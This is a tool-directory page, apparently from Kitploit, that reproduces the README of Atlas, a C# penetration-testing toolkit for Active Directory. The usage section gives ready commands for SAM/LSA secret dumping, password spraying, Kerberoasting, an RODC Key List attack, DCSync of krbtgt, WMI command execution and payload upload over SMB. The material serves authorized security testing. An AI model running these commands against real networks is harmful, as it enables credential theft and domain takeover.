---
title: Atlas
url: https://kitploit.com/en/tools/github/portbuster1337/atlas
source: Kitploit
date: 2026-08-28
fetch_date: 2026-08-29T08:31:00.741635
---

# Atlas

[Skip to content](#main-content)

[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories

EN

[Submit](/en/submit)

[Tools](/en/tools)[Blog](/en/blog)Categories

[Submit](/en/submit)

EN

Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!

Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.

·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit

Tool Directory

## Categories

[View all categories](/en/categories)

Loading categories

Atlas — Cross-platform network execution toolkit (SMB/Kerberos/WMI/LDAP/DCSync) built on TrustedSec's Titanis - NetExec-style workflow in C# | Kitploit

[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/portbuster1337/atlas

![](https://assets.kitploit.com/production/public/tools/53457/3486872ec85e3105645cec10033fcc1c9b1f409d92518649fb1c7f0ca5304fa3-display-v1.webp)

[Reconnaissance](/en/categories/reconnaissance)[Exploitation](/en/categories/exploitation)[Lateral Movement](/en/categories/lateral-movement)[Post-Exploitation](/en/categories/post-exploitation)[Network Security](/en/categories/network-security)[Penetration Testing](/en/categories/penetration-testing)[Red Teaming](/en/categories/red-teaming)

![GitHub](/providers/github.png)portbuster1337/atlas

# Atlas

Cross-platform network execution toolkit (SMB/Kerberos/WMI/LDAP/DCSync) built on TrustedSec's Titanis - NetExec-style workflow in C#

[View Repository](https://github.com/portbuster1337/atlas)

484213 days ago![Not yet reviewed](/_next/image?url=%2Fbadges%2Fkitploit_badge_not_reviewed_full.png&w=48&q=75)

### Most Popular

[View all →](/en/tools)

Discover the most used tools by our community.

Last 7 DaysLast 30 Days

Explore all tools

Browse our collection of tools

[View all tools →](/en/tools)

Share

# Atlas

**Atlas** is a cross-platform (Windows/Linux) network execution and security assessment toolkit built on top of [TrustedSec's Titanis](https://github.com/trustedsec/Titanis) protocol library. It is inspired by the workflow of NetExec/CrackMapExec: target lists, credential sets, modular enumeration, and compact `[HH:mm:ss] [+] host - message` console output.

> This tool is intended for **authorized security testing**. Only use against systems you have explicit permission to test.

## Features

| Protocol | Capabilities |
| --- | --- |
| `smb` | Auth check (NTLM/Kerberos/anonymous), shares, users, groups, disks, sessions via SRVS/SAMR RPC; SAM & LSA secret dumping via Remote Registry; directory listing, get/put/mkdir/rm over SMB2/3 |
| `kerberos` | User enumeration (AS-REQ classification), pre-auth / AS-REP roastable detection, Kerberoasting with hashcat-format output, Key List attack against RODCs |
| `wmi` | Auth check via DCOM/WMI, remote command execution via `Win32_Process.Create` |
| `ldap` | Auth check (SASL or RFC 4511 simple bind), paged subtree queries with attribute selection |
| `dcsync` | Replicate credential material from a DC via [MS-DRSR] (`IDL_DRSGetNCChanges` + `EXOP_REPL_OBJ`) |

### Modules

Shared across all protocols:

* Target specification: single host/IP, CIDR, ranges (`a.b.c.d-e`), comma lists, `@file`
* Full authentication matrix inherited from Titanis: passwords, NT hashes, AES keys, keytabs, `.kirbi`/`.ccache` tickets, PKINIT certificates, S4U, SPN overrides, SOCKS5
* Multi-host fan-out with configurable concurrency and per-host timeout
* NetExec-style console output

## Requirements

* [.NET SDK 9.0+](https://dotnet.microsoft.com/download/dotnet/9.0) (some vendored Titanis projects use C# 13)
* Network reachability to targets (445/TCP for SMB, 88/TCP for Kerberos, 389/TCP for LDAP, 135/TCP + dynamic RPC ports for WMI/DCSync)

## Build

The repository vendors the Titanis source under `external/Titanis` and builds it as part of the solution.

root@kitploit:~

```
git clone https://github.com/<your-account>/atlas.git
cd atlas
dotnet build Atlas.sln -p:NoWarn=CS1998
```

The resulting binary is a framework-dependent .NET application:

root@kitploit:~

```
dotnet src/Atlas.Cli/bin/Debug/net8.0/atlas.dll --help
```

## Usage

root@kitploit:~

```
atlas <protocol> <targets> [authentication] [actions] [options]
```

Target specification accepts any mix of: `HOST`, `10.0.0.5`, `192.168.1.0/24`, `10.0.0.1-64`, comma-separated lists, or `@targets.txt`.

### SMB

root@kitploit:~

```
# Credential check only
atlas smb 10.0.0.5 -u administrator -p 'Password1!'

# Enumeration
atlas smb 10.0.0.0/24 -u admin -p 'Password1!' -Shares -Users -Groups -Disks -Sessions

# SAM / LSA dumping (requires local admin)
atlas smb 10.0.0.5 -u admin -p 'Password1!' -Sam -Lsa

# File operations
atlas smb 10.0.0.5 -u admin -p pass -LsPath 'C$\Users'
atlas smb 10.0.0.5 -u admin -p pass -GetFile 'C$\Windows\win.ini'
atlas smb 10.0.0.5 -u admin -p pass -PutSource ./payload.bin -PutDest 'C$\Temp\payload.bin'

# Modules
atlas smb 10.0.0.0/24 -u admin -p pass -M spider -mo 'depth=3,maxfiles=50,match=.conf'
atlas smb 10.0.0.0/24 -u admin -p pass -M shareaccess
atlas smb 10.0.0.5 -u admin -p pass -M localadmins

# Password spray
atlas smb 10.0.0.0/24 -UserList users.txt -PassList 'Password1!,Summer2024!'
```

### Kerberos

root@kitploit:~

```
# User enumeration (no credentials required)
atlas kerberos dc01.corp.local -d CORP.LOCAL -UserList users.txt

# Kerberoasting (requires any domain credential)
atlas kerberos dc01.corp.local -d CORP.LOCAL -Roast -u lowpriv -p 'Password1!'
atlas kerberos dc01.corp.local -d CORP.LOCAL -Roast -u lowpriv -p pass -SpnList 'MSSQLSvc/sql01.corp.local:1433'

# Key List attack against an RODC
atlas kerberos rodc01.corp.local -d CORP.LOCAL -rodcNo 20000 -rodcKey <aes256-hex> -UserList 'jdoe:1104'
```

### WMI

root@kitploit:~

```
atlas wmi dc01.corp.local -d CORP.LOCAL -u admin -p pass           # auth check
atlas wmi dc01.corp.local -d CORP.LOCAL -u admin -p pass -x whoami # exec
```

### LDAP

root@kitploit:~

```
# SASL (NTLM/Kerberos) bind - typical against Active Directory
atlas ldap dc01.corp.local -d CORP.LOCAL -u user -p pass -Query '(adminCount=1)' -Attrs sAMAccountName

# RFC 4511 simple bind - typical against OpenLDAP
atlas ldap ldap.example.com -bd 'cn=admin,dc=example,dc=com' -bp password \
    -Query '(objectClass=*)' -Base 'dc=example,dc=com'
```

### DCSync

root@kitploit:~

```
atlas dcsync dc01.corp.local -d CORP.LOCAL -u admin -p pass krbtgt
atlas dcsync dc01.corp.local -d CORP.LOCAL -u admin -p pass jdoe '(adminCount=1)'
```

### Authentication options (all protocols)

Run `atlas <protocol> -h` for the complete parameter reference.

## Repository layout

root@kitploit:~

```
Atlas.sln
Directory.Build.props      Intentional no-op (see note)
src/
  Atlas.props              Shared build settings (imported explicitly by Atlas projects)
  Atlas.Core/              Targets parsing, console output, module registry
  Atlas.Protocols.Smb/     SMB host + modules
  Atlas.Protocols.Kerberos/ AS-REQ enumeration, roasting, Key List attack
  Atlas.Protocols.Wmi/     WMI/DCOM host
  Atlas.Protocols.Ldap/    LDAP host
  Atlas.Protocols.Drsr/    DCSync
  Atlas.Cli/               Entry point / protocol dispatcher
external/Titanis/          Vendored Titanis source (built from source; not on NuGet)
```

> **Note:** `Directory.Build.props` at the repository root is intentionally empty. Titanis's build imports `$(SolutionDir)Directory.Build.props`; the file must exist when building from this solution but must stay empty so upstream settings do not leak into the vendored tree.

## License

This project links against and distributes source from TrustedSec's Titanis, which is licensed GPL-3.0. Accordingly, this project is distributed under **GPL-3.0**. See `external/Titanis/LICENSE`.

[Download Tool](https://github.com/portbuster1337/atlas)

| Module | Protocol ...